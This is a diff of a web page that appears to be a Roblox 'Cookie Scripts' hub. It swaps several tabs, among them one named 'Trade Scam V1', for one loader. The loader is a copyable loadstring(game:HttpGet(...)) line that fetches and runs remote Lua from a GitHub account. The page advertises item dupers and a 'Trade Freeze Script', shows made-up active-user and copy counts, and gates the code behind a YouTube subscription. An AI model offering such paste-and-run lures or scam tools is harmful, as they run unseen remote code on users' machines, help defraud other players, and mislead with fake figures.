@@ -42,12 +42,9 @@ h1{
   flex:1;
   padding:10px;
   border-radius:10px;
-  background:#1a1230;
-  text-align:center;
-  cursor:pointer;
-}
-.tab.active{
   background:linear-gradient(90deg,#8f4dff,#c77dff);
+  text-align:center;
+  font-weight:bold;
 }
 
 .card{
@@ -101,6 +98,21 @@ button.locked{
   box-shadow:0 0 14px rgba(255,60,60,.7);
 }
 
+.features-box{
+  margin-top:14px;
+  padding:12px;
+  background:#120d25;
+  border-radius:12px;
+  font-size:13px;
+  line-height:1.6;
+}
+
+.features-title{
+  font-weight:bold;
+  margin-bottom:6px;
+  color:#c77dff;
+}
+
 .stats{text-align:center;margin-top:8px;font-size:13px;opacity:.7}
 footer{text-align:center;font-size:12px;opacity:.5;margin-top:18px}
 
@@ -127,9 +139,7 @@ footer{text-align:center;font-size:12px;opacity:.5;margin-top:18px}
   <div class="active pulse">👥 Active Users: <span id="users">189</span></div>
 
   <div class="tabs">
-    <div class="tab active" onclick="switchTab(0)">Trade Scam V1</div>
-    <div class="tab" onclick="switchTab(1)">Token Duper</div>
-    <div class="tab" onclick="switchTab(2)">Brainrot Duper</div>
+    <div class="tab">Script</div>
   </div>
 
   <div id="content"></div>
@@ -139,25 +149,12 @@ footer{text-align:center;font-size:12px;opacity:.5;margin-top:18px}
 <div id="toast" class="toast">✅ Script Copied</div>
 
 <script>
-const scripts=[
-{
-name:"Cookie Trade Scam V1",
-code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()`,
-copies:2431
-},
-{
-name:"Cookie Script Token Duper",
-code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()`,
-copies:1892
-},
-{
-name:"Cookie Scripts Duper (ETFB)",
-code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()`,
-copies:3015
-}
-];
+const scriptData={
+name:"Cookie Scripts Hub Loader",
+code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/cookiescriptshub/refs/heads/main/loader.lua"))()`,
+copies:5421
+};
 
-let current=0;
 const content=document.getElementById("content");
 const toast=document.getElementById("toast");
 
@@ -166,18 +163,17 @@ function isUnlocked(){
 }
 
 function render(){
-  const s=scripts[current];
   const unlocked=isUnlocked();
 
   content.innerHTML=`
   <div class="card">
-    <div class="title">${s.name} 🍪</div>
+    <div class="title">${scriptData.name} 🍪</div>
     <div class="status">🟢 <span>WORKING</span></div>
 
     ${
       unlocked
-      ? `<pre>${s.code}</pre>`
-      : `<pre class="pre-locked">${s.code}</pre>
+      ? `<pre>${scriptData.code}</pre>`
+      : `<pre class="pre-locked">${scriptData.code}</pre>
          <div class="lock-overlay">🔒 Locked</div>`
     }
 
@@ -185,15 +181,15 @@ function render(){
       ${unlocked?'📋 Copy Script':'🔒 Sub to Unlock'}
     </button>
 
-    <div class="stats">Copied ${s.copies} times</div>
-  </div>`;
-}
+    <div class="features-box">
+      <div class="features-title">✨ Features</div>
+      • Brainrot Duper<br>
+      • Trade Token Duper<br>
+      • Trade Freeze Script
+    </div>
 
-function switchTab(i){
-  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
-  document.querySelectorAll(".tab")[i].classList.add("active");
-  current=i;
-  render();
+    <div class="stats">Copied ${scriptData.copies} times</div>
+  </div>`;
 }
 
 function handleAction(){
@@ -202,8 +198,8 @@ function handleAction(){
     window.open("https://www.youtube.com/@cookie_scripts","_blank");
     return;
   }
-  navigator.clipboard.writeText(scripts[current].code);
-  scripts[current].copies++;
+  navigator.clipboard.writeText(scriptData.code);
+  scriptData.copies++;
   render();
   toast.classList.add("show");
   setTimeout(()=>toast.classList.remove("show"),1200);
